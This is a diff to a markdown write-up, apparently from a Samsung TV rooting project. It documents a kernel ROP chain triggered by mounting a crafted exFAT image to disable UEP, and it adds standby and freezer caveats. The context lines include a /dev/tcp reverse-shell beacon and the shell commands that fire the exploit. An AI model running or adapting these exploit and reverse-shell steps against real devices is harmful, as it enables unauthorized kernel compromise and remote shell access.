@@ -52,7 +52,8 @@ again in the field):
   the frame, runs the ROP chain, patches UEP, and **parks its kernel thread**.
   The read then hangs in D-state forever — the hang IS the success signature
   (the chain's park gadget deliberately never returns). One parked thread per
-  firing; invisible to userspace; freed at reboot.
+  firing; invisible to userspace (but **not** to the system freezer); freed at
+  reboot. See [Standby and freezer](#standby-and-freezer) below.
 - The stage's beacon (`exec 9<>/dev/tcp/HOST/PORT; echo UEP DOWN >&9; bash -i…`)
   connects after the patch. With a listener on HOST:PORT the proof is literal:
 
@@ -61,6 +62,29 @@ again in the field):
       bash-3.2#
 
   Without a listener the beacon bash exits silently — no lingering process.
+
+## Standby and freezer
+
+Measured 2026-11-09. The parked readdir task is a user task in D state, not a
+kernel thread:
+
+* On the Q70T it remains in `schedule_timeout_uninterruptible` (`0xc05330e0`)
+  with the exFAT directory fd open (`fd -> /tmp/uep`).
+* `kill -9` leaves `SigPnd` set; the task never reaches signal delivery.
+* `umount -l /tmp/uep` succeeds, but `losetup -d /dev/loopN` returns 0 while
+  `losetup -a` still lists the loop. The task holds the block-device
+  reference; the detach is deferred behind it.
+* Moving the task into a fresh freezer cgroup and writing `FROZEN` leaves the
+  group in `FREEZING` for the full 25 s. The system standby freezer deadline
+  is 20 s, so a standby transition can fail and restart the TV. The same
+  behavior was reported on a Q85R (Lolinho77).
+
+The practical consequence: **boot-time UEP-down is opt-in**. The default
+`debloat.sh` starts the root agent and debloat but leaves UEP up; use
+[`persistent-hook/fire-uep.sh`](../persistent-hook/fire-uep.sh) when you need
+root SSH or unsigned binaries, and reboot afterwards if standby must work. A
+kernel-side fix that sets `PF_NOFREEZE` on the parked task (or a trigger that
+does not park a user task) is an open research item.
 
 ## Procedure
 
@@ -76,7 +100,7 @@ losetup "$LP" -o 1048576 /opt/usr/share/tvroot/nikem-usb-uep2.img
 mkdir -p /tmp/uep-t
 mount -t exfat "$LP" /tmp/uep-t                   # completes cleanly
 ( ls /tmp/uep-t >/dev/null 2>&1 & )               # fires the chain; hangs = success
-( sleep 30; umount -l /tmp/uep-t 2>/dev/null ) &  # detach after UEP is down
+( sleep 30; umount -l /tmp/uep-t 2>/dev/null ) &  # detach the mount entry; the loop stays parked
 ```
 
 ## Boot-time integration (deployed, verified)
@@ -109,7 +133,11 @@ fi
 
 Guards: `/run/uep-fired` is created only after the mount succeeds, so the
 chain fires exactly once per boot; a failed mount detaches the loop and the
-boot continues (degraded: UEP stays up, no unsigned binaries).
+boot continues (degraded: UEP stays up, no unsigned binaries). The boot hook
+is now **opt-in**: keep `/opt/usr/share/tvroot/uep-enable` absent (or as
+`uep-enable.off`) unless you accept the standby caveat. The try counter is
+two-phase: an attempt marker is written immediately before the fire; a
+previous attempt without a success marker consumes one try at the next boot.
 
 ## Verification (stickless boot, 2026-10-25 23:38)
 
@@ -117,7 +145,8 @@ boot continues (degraded: UEP stays up, no unsigned binaries).
 - USB enumeration: only the TV's own Wireless_Device (04e8:20b6); no stick
 - dropbear up (~60–90s, via the existing retry loop)
 - `mount` table clean after the 30s lazy-unmount; `df` instant; exactly one
-  D-state `ls` parked thread
+  D-state `ls` parked thread, still holding the loop (see
+  [Standby and freezer](#standby-and-freezer))
 
 ## Caveats
 
@@ -128,4 +157,6 @@ boot continues (degraded: UEP stays up, no unsigned binaries).
 - Loop allocation is dynamic (`losetup -f`); grabbing an early loop just
   shifts the squashfs mounts to the next free device.
 - The parked thread holds the loop device and the exFAT superblock until
-  reboot; nothing in the mount namespace remains, so nothing can hang on it.
+  reboot; `losetup -d` returns 0 but does not detach, and the task blocks the
+  system freezer, so standby may fail. Reboot after a manual fire if you need
+  standby.
